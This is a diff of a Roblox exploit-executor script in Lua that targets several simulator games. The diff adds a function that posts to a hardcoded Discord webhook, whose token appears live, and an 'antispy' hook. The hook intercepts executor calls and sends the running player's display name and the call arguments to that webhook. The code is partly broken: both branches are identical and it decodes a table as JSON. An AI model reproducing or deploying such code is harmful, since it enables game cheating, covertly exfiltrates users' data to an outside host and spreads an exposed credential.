@@ -13,6 +13,27 @@ https://www.roblox.com/games/12152063271/BARU-Simulator-Pukulan-Bola-Api?gameSet
 https://www.roblox.com/games/14168050172/Simulator-Gauntlet?gameSetTypeId=100000003&homePageSessionInfo=7d1834d6-9512-4dbc-ad60-c6386c262834&isAd=false&numberOfLoadedTiles=6&page=homePage&placeId=14168050172&position=0&sortPos=0&universeId=4903983422
 ]]
 
+local http = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
+local HttpService = game:GetService("HttpService")
+local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
+
+local function SendMessage(url,message)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = message
+    }
+    local body = HttpService:JSONEncode(data)
+    local response = http({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("Sent")
+end
+
 local function antispy()
 for i, v in next,expfunctions do
     local old = hookfunction(v,newcclosure(function(...)
@@ -20,8 +41,8 @@ for i, v in next,expfunctions do
                 for i,v in next,args do
                     if tostring(i):find("https") or tostring(v):find("https") then
                         SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
-			              else
-			                  SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
+		    else
+		        SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
                     end
                 end
                 return old(...)
